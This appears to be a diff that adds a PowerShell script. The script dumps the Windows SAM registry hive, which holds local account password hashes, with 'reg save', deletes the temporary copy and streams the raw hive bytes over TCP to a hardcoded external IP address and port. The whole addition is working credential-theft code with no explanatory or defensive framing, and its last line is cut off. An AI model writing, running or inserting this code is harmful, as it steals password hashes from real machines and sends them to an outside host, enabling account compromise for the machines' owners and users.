@@ -1,0 +1,39 @@
+$server = "154.205.145.20"
+$port   = 8090
+
+$client = New-Object System.Net.Sockets.TcpClient
+$client.Connect($server, $port)
+
+$stream = $client.GetStream()
+$writer = New-Object System.IO.BinaryWriter($stream)
+
+# Send a simple header
+$writer.Write([System.Text.Encoding]::UTF8.GetBytes("HIVEUPLOAD`n"))
+
+$hives = @("SAM")
+
+foreach ($hive in $hives) {
+    $tempFile = Join-Path $env:TEMP "$hive.tmp"
+    cmd.exe /c "reg save HKLM\$hive `"$tempFile`" /y" | Out-Null
+    
+    $bytes = [System.IO.File]::ReadAllBytes($tempFile)
+    Remove-Item $tempFile -Force
+
+    # Send hive name length + name
+    $writer.Write([BitConverter]::GetBytes($hive.Length))
+    $writer.Write([System.Text.Encoding]::UTF8.GetBytes($hive))
+
+    # Send hive data length
+    $writer.Write([BitConverter]::GetBytes($bytes.Length))
+
+    # Send raw hive data in chunks
+    $chunkSize = 8192
+    for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
+        $len = [Math]::Min($chunkSize, $bytes.Length - $i)
+        $writer.Write($bytes, $i, $len)
+    }
+}
+
+$writer.Flush()
+$stream.Close()
+$client.Close(
